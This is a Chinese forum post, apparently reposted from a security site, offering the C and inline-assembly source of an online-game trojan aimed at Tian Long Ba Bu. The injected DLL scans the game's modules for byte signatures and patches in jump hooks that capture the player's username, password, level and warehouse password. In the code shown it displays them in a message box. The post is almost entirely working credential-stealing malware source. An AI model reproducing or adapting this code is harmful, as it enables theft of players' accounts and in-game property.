

# 天龙八部木马核心代码，版本 0.50.0385

> 原文：[`www.pediy.com/kssd/pediy10/72600.html`](https://www.pediy.com/kssd/pediy10/72600.html)

信息来源：邪恶八进制信息安全团队（www.eviloctal.com）  
文章作者：认真的雪  
  
  
我也来凑凑热闹.....  
发一个网游木马核心代码...无聊的时候写的..  
截取了用户名，密码，等级，仓库密码   
  

代码:

```
#include <windows.h>
BYTE userCode\[7\]={0x8B,0x45,0x0C,0x50,0x8D,0x4B,0x5C};
BYTE userJmpCode\[6\]={0xe9,0x00,0x00,0x00,0x00,0x90};

BYTE gradeCode\[6\]={0x89,0x9F,0xFC,0x00,0x00,0x00};
BYTE gradeJmpCode\[6\]={0xe9,0x00,0x00,0x00,0x00,0x90};

BYTE storeCode\[9\]={0x8B,0x4E,0x04,0x33,0xC5,0x57,0x8B,0x7D,0x08};
BYTE oldStoreCode\[6\]={0};
BYTE storeJmpCode\[6\]={0xe9,0x00,0x00,0x00,0x00,0x90};

DWORD ui\_cegui;

void  \*lpUserRet=NULL;
void  \*lpGradeRet=NULL;
void  \*lpStoreRet=NULL;



char user\[40\];
char pass\[40\];
char storePassWord\[40\];
DWORD dwGrade;


DWORD stroePath=0;
void \_stdcall StroeUnhook();

void \_stdcall HookStroe();
DWORD CmpFlag(BYTE \*flag,char \*moduleName,int len,void \*\*lpRet , DWORD \*lpModule)
{
        BYTE \*buff=NULL;        

        HMODULE hModule=::GetModuleHandle(moduleName);
        if(hModule==NULL)
        {
                ::MessageBox(NULL,"获取模块错误","failed",0);
                return 0;
        }

        DWORD imageSize=\*(DWORD\*)(\*(DWORD\*)((DWORD)hModule+0x3c)+(DWORD)hModule+0x50);
        void \*newModule=VirtualAlloc( NULL, imageSize, MEM\_COMMIT | MEM\_RESERVE, PAGE\_EXECUTE\_READWRITE);
        \*lpModule=(DWORD)newModule;
        memcpy(newModule,(void\*)hModule,imageSize);

        for(DWORD i=0;i<imageSize;i++)
        {
                buff=(BYTE\*)((DWORD)newModule+i);
                if(memcmp(buff,flag,len)==0)
                {

                        \*lpRet=(void\*)buff;
                        return i+(DWORD)hModule;
                        
                }

        }

        return 0;

}

DWORD GetRealFlag(BYTE \*flag,char \*moduleName,int len,void \*\*lpRet,DWORD newModule)
{
        BYTE \*buff=NULL;

        HMODULE hModule=::GetModuleHandle(moduleName);

        if(hModule==NULL)
        {
                ::MessageBox(NULL,"获取模块错误","failed",0);
                return 0;
        }  
        DWORD imageSize=\*(DWORD\*)(\*(DWORD\*)((DWORD)hModule+0x3c)+(DWORD)hModule+0x50);
        for(DWORD i=0;i<imageSize;i++)
        {
                buff=(BYTE\*)(newModule+i);
                if(memcmp(buff,flag,len)==0)
                {

                
                        \*lpRet=(void\*)buff;
                        return i+(DWORD)hModule;
                        
                }

        }
        return 0;



}

void \_stdcall GetUserBuff(char \*userName,char \*passWord)
{
        strcpy(user,userName);
        strcpy(pass,passWord);
        
        return;
        
}



\_\_declspec(naked)void GetUserAndPass()
{
        \_asm
        {
                push eax;
                mov eax,dword ptr ss:\[ebp+0xC\];
                push eax;
                push ecx;
                call GetUserBuff;
                call StroeUnhook;
                pop eax;
            jmp \[lpUserRet\];
        }
}

void \_stdcall GetGradeDword(DWORD grade)
{
        dwGrade=grade;
        return;


}


\_\_declspec(naked)void GetGrade()
{
        \_asm
        {
                pushad;
                push ebx;
                call GetGradeDword;
                call HookStroe;
                popad;
            jmp \[lpGradeRet\];
        }
}



void \_stdcall StroeUnhook()
{
        if(stroePath==0)
                return;
        MEMORY\_BASIC\_INFORMATION mbi;
        VirtualProtect((void\*)stroePath,7,PAGE\_READWRITE,(DWORD\*)&mbi);
        memcpy((void\*)stroePath,oldStoreCode,6);  
        VirtualProtect((void\*)stroePath,7,mbi.Protect,0);
        return;  

}

void \_stdcall GetStoreBuff(char \*storePass)
{
        strcpy(storePassWord,storePass);
        char data\[256\];
        wsprintf(data,"用户名：%s\\n 密码：%s\\n 等级：%d\\n 仓库密码：%s\\n",user,pass,dwGrade,storePassWord);

        ::MessageBox(NULL,data,"ok",0);


}
\_\_declspec(naked)void GetStore()
{
        \_asm
        {
                pushad;
                push ecx;
                call GetStoreBuff;
                call StroeUnhook;
                popad;
                jmp \[lpStoreRet\];
        

        }
}  



void \_stdcall HookStroe()
{  
        stroePath=GetRealFlag(storeCode,"ui\_cegui.dll",9,&lpStoreRet,ui\_cegui);
        if(stroePath==0)
                return ;
        stroePath=stroePath+0x43;
        lpStoreRet=(void\*)((DWORD)lpStoreRet+0x43);
        DWORD jmpAddress=(DWORD)GetStore-(stroePath+5);  
        \*(DWORD\*)(&storeJmpCode\[1\])=jmpAddress;
        memcpy(oldStoreCode,(BYTE\*)stroePath,6);


        MEMORY\_BASIC\_INFORMATION mbi;
        VirtualProtect((void\*)stroePath,7,PAGE\_READWRITE,(DWORD\*)&mbi);
        memcpy((void\*)stroePath,storeJmpCode,6);  
        VirtualProtect((void\*)stroePath,7,mbi.Protect,0);
        return;

}
void HookGrade()
{
        
    DWORD passPath=CmpFlag(gradeCode,"ui\_cegui.dll",6,&lpGradeRet,&ui\_cegui);
        if(passPath==0)
                return ;
        DWORD jmpAddress=(DWORD)GetGrade-(passPath+5);
        \*(DWORD\*)(&gradeJmpCode\[1\])=jmpAddress;
        MEMORY\_BASIC\_INFORMATION mbi;
        VirtualProtect((void\*)passPath,7,PAGE\_READWRITE,(DWORD\*)&mbi);
        memcpy((void\*)passPath,gradeJmpCode,6);  
        VirtualProtect((void\*)passPath,7,mbi.Protect,0);



}

void HookUserAndPass()
{
        DWORD hModule;
        DWORD passPath=CmpFlag(userCode,"game.exe",7,&lpUserRet,&hModule);
        if(passPath==0)
                return ;
        DWORD jmpAddress=(DWORD)GetUserAndPass-(passPath+5);
        \*(DWORD\*)(&userJmpCode\[1\])=jmpAddress;
        MEMORY\_BASIC\_INFORMATION mbi;
        VirtualProtect((void\*)passPath,7,PAGE\_READWRITE,(DWORD\*)&mbi);
        memcpy((void\*)passPath,userJmpCode,6);  
        VirtualProtect((void\*)passPath,7,mbi.Protect,0);
}
DWORD WINAPI Thread(LPVOID lpParam)
{
        HookUserAndPass();
        HookGrade();

        return 0;
}

BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul\_reason\_for\_call, 
                       LPVOID lpReserved
                                         )
{

        
        switch(ul\_reason\_for\_call)
        {
        case DLL\_PROCESS\_ATTACH:
                {
                        DWORD ThreadId;
                        CreateThread(NULL,NULL,Thread,NULL,NULL,&ThreadId);
                        break;
                }
        
        default:break;
        }
        
    return TRUE;
}

```